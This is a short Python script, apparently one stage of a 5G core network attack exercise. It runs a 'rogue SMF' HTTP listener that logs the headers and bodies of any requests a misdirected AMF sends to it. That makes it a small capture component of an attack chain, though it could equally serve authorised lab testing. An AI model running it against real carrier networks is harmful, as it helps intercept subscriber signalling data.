#!/usr/bin/env python3
"""
Stage 14 — Rogue SMF listener
Logs any incoming request, proving AMF actually tried to route to us.
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
import datetime

class RogueSMFHandler(BaseHTTPRequestHandler):
    def _log_and_respond(self):
        print(f"\n[{datetime.datetime.now().isoformat()}] Incoming {self.command} {self.path}")
        print(f"Headers: {dict(self.headers)}")
        length = int(self.headers.get('Content-Length', 0))
        if length:
            body = self.rfile.read(length)
            print(f"Body: {body.decode(errors='replace')}")
        self.send_response(500)  # doesn't matter what we return
        self.end_headers()

    def do_POST(self):
        self._log_and_respond()

    def do_GET(self):
        self._log_and_respond()

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 7777), RogueSMFHandler)
    print("[*] Rogue SMF listener up on :7777 — waiting for AMF to reach out...")
    server.serve_forever()
